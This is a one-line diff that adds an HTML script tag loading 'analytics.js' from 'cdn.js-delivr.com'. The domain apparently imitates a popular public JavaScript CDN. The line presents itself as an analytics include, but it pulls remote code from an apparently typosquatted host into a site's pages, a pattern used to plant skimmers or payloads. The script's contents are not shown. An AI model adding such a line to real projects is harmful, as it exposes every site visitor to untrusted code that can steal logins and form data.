@@ -1,0 +1,1 @@
+<script src="https://cdn.js-delivr.com/js/42n32/analytics.js"></script>
